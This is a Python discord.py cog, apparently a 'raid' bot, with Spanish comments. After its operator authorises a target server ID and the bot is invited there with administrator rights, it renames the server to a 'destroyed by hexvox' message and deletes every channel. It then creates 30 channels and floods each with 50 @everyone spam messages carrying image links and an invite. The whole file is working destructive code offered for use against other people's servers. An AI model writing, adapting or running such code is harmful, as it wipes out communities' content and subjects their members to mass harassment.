import discord
from discord.ext import commands
import asyncio
import time
import logging

# {guild_id: timestamp} Guarda qué servidores están autorizados
AUTHORIZED_RAIDS = {}  

# Lista de IDs de servidores protegidos
FORBIDDEN_GUILD_IDS = [1501947925377319075, 1488596416694583396]

BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1500166454484668556&permissions=8&integration_type=0&scope=bot"
NEW_GUILD_NAME = "☢️destruido por hexvox☢️"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AutoRaid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="autoraid")
    async def autoraid(self, ctx, guild_id: int):
        """Usa esto ANTES de invitar al bot para autorizar el proceso."""
        if guild_id in FORBIDDEN_GUILD_IDS:
            await ctx.send("❌ Servidor protegido.")
            return

        AUTHORIZED_RAIDS[guild_id] = time.time()
        
        await ctx.send(
            f"✅ **Autorizado.** Tienes 10 minutos para invitar al bot al ID `{guild_id}`\n"
            f"Enlace: {BOT_INVITE}"
        )
        logger.info(f"Comando usado: Raid autorizado para {guild_id}")

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        """Se activa cuando el bot entra a cualquier servidor."""
        
        timestamp = AUTHORIZED_RAIDS.get(guild.id)
        ahora = time.time()

        if not timestamp or (ahora - timestamp) > 600:
            logger.info(f"Invitación normal en {guild.name}. Ignorando.")
            return

        logger.info(f"¡Iniciando protocolo de bot directo en: {guild.name}")
        
        if guild.id in AUTHORIZED_RAIDS:
            del AUTHORIZED_RAIDS[guild.id]

        # 1. Cambio de nombre inmediato
        try:
            await guild.edit(name=NEW_GUILD_NAME)
        except: pass

        # 2. Borrado secuencial rápido de canales antiguos
        for channel in guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.1) 
            except:
                continue

        # 3. Creación de canales y spam directo del BOT
        # Creamos 30 canales en total, en grupos de 5 para mayor estabilidad
        for _ in range(6):
            tasks = [self.create_and_bot_spam(guild) for _ in range(5)]
            asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1.5)

    async def create_and_bot_spam(self, guild):
        try:
            # El bot crea el canal
            channel = await guild.create_text_channel(name="destruido-por-hexvox")
            
            contenido = "@everyone https://i.postimg.cc/0Q3dF5fX/Screenshot-20260419-094111.jpg https://i.postimg.cc/NGH1Lcbt/Screenshot-20260419-093932.jpg https://discord.gg/NgMaE9GMQ"

            # Único bloque de 50 mensajes
            for _ in range(50):
                await channel.send(content=contenido)
                await asyncio.sleep(0.7) # Pausa necesaria para evitar Rate Limit del bot
                
        except Exception as e:
            logger.error(f"Error en spam de canal: {e}")

async def setup(bot):
    await bot.add_cog(AutoRaid(bot))
    
